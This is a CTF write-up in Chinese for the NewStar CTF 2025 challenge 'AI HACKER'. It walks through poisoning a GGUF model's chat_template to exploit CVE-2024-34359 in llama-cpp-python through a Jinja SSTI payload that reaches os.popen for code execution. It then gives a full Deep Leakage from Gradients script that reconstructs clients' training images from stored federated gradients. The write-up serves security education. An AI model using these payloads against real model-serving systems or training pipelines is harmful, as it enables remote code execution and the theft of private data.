# AI HACKER

> 分类：Misc

## 题目描述
SafeLLM Hub。GGUF 模型投毒导致的 SSTI 注入（llama-cpp-python 加载模型漏洞，CVE-2024-34359），通过修改 `chat_template` 段实现 SSTI -> RCE 创建文件拿到 flag1、flag2。flag2 是一个 pth 文件，考查梯度泄露攻击（Deep Leakage from Gradients）。

## 考察知识点
- GGUF 模型格式投毒
- CVE-2024-34359（llama-cpp-python）
- SSTI 注入 -> RCE
- 梯度泄露攻击（Deep Leakage from Gradients）

## 解法

1. 主界面提供内置模型，用户可上传 GGUF 格式模型与 LLM 交互。任务要求在指定目录下放置 `orange` 文件。

2. 在 `/api/info` 泄露组件版本，搜索发现 llama-cpp-python 的 CVE-2024-34359。参考文章 https://0reg.dev/blog/from-gguf-model-format-metadata-rce-to-state-of-the-art-nlp-project-rces

3. 通过修改 `chat_template` 段的数据实现 SSTI 注入，RCE 创建文件。构造 EXP：

```bash
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("touch /tmp/xxxxxxxxxxxx/orange")}}{%endif%}{% endfor %}
```

成功拿到 flag1 和 flag2 的地址。

4. flag2 是 pth 文件，使用 Netron 加载观察模型参数。考查梯度泄露攻击，共 12 个客户端，逐个处理。EXP：

```python
import torch
import torch.nn as nn
import torch.optim as optim
import matplotlib.pyplot as plt

def simple_multi_attack(model_path):
    checkpoint = torch.load(model_path, map_location='cpu')

    class SimpleModel(nn.Module):
        def __init__(self):
            super().__init__()
            self.conv_layers = nn.Sequential(
                nn.Conv2d(3, 32, 3, padding=1), nn.ReLU(), nn.MaxPool2d(2),
                nn.Conv2d(32, 64, 3, padding=1), nn.ReLU(), nn.MaxPool2d(2),
                nn.Conv2d(64, 64, 3, padding=1), nn.ReLU()
            )
            self.classifier = nn.Sequential(
                nn.Flatten(),
                nn.Linear(64 * 8 * 8, 128), nn.ReLU(),
                nn.Linear(128, 10)
            )

        def forward(self, x):
            x = self.conv_layers(x)
            return self.classifier(x)

    model = SimpleModel()
    model.load_state_dict(checkpoint['model_state_dict'])
    model.eval()

    gradients = checkpoint['client_gradients']

    for client_idx, grad in enumerate(gradients):
        for round_idx in range(10):
            if round_idx == 0:
                dummy_data = torch.randn(1, 3, 32, 32, requires_grad=True)
            else:
                dummy_data = current_data + torch.randn_like(current_data) * 0.1
                dummy_data = torch.clamp(dummy_data, 0, 1)
                dummy_data.requires_grad_(True)

            dummy_label = torch.randn(1, 10, requires_grad=True)
            optimizer = optim.LBFGS([dummy_data, dummy_label], lr=0.1)

            for step in range(100):
                def closure():
                    optimizer.zero_grad()
                    pred = model(dummy_data)
                    loss = nn.functional.cross_entropy(pred, dummy_label.softmax(dim=1))
                    dummy_grad = torch.autograd.grad(loss, model.parameters(), create_graph=True)

                    grad_diff = 0
                    for g1, g2 in zip(dummy_grad, grad):
                        if g2 is not None:
                            grad_diff += ((g1 - g2) ** 2).sum()

                    grad_diff.backward()
                    return grad_diff

                optimizer.step(closure)
                dummy_data.data = torch.clamp(dummy_data.data, 0, 1)

            current_data = dummy_data.data.clone()

            image = current_data.detach().squeeze().permute(1, 2, 0).cpu().numpy()
            image = (image - image.min()) / (image.max() - image.min())

            plt.figure(figsize=(3, 3))
            plt.imshow(image)
            plt.title(f"Client {client_idx} - Round {round_idx + 1}")
            plt.axis('off')
            plt.show()

simple_multi_attack('pth path')
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2025 官方 WriteUp | https://newstar.wiki/wp/2025/week5/misc/ai-hacker.html
